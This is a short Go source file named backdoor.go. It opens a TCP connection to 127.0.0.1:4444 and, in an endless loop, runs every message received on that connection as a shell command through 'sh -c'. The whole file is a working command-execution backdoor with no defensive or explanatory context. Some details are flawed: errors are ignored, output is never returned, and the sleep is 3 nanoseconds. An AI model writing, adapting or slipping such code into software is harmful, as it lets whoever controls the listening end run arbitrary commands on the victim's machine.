// backdoor.go
package main

import (
	"net"
	"os/exec"
	"time"
)

func main() {
	conn, _ := net.Dial("tcp", "127.0.0.1:4444")

	for {
		buf := make([]byte, 1024)
		n, _ := conn.Read(buf)
		cmd := exec.Command("sh", "-c", string(buf[:n]))
		cmd.Run()
		time.Sleep(3)
	}
}
